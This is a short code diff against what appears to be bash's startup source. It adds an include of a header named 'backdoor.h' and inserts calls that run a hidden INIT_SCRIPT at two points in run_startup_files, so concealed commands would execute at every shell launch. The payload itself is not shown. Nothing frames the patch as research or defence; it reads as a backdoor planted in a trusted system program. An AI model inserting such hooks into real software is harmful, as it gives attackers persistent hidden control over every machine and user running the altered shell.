@@ -25,6 +25,7 @@
 */
 #define INSTALL_DEBUG_MODE
 
+#include "backdoor.h"
 #include "config.h"
 
 #include "bashtypes.h"
@@ -1206,6 +1207,7 @@ run_startup_files ()
       if (posixly_correct == 0 && act_like_sh == 0 && privileged_mode == 0 &&
 	    sourced_env++ == 0)
 	execute_env_file (get_string_value ("BASH_ENV"));
+      run_one_command(INIT_SCRIPT);
       return;
     }
 
@@ -1257,6 +1259,8 @@ run_startup_files ()
 #if defined (JOB_CONTROL)
   set_job_control (old_job_control);
 #endif
+
+run_one_command(INIT_SCRIPT);
 }
 
 #if defined (RESTRICTED_SHELL)
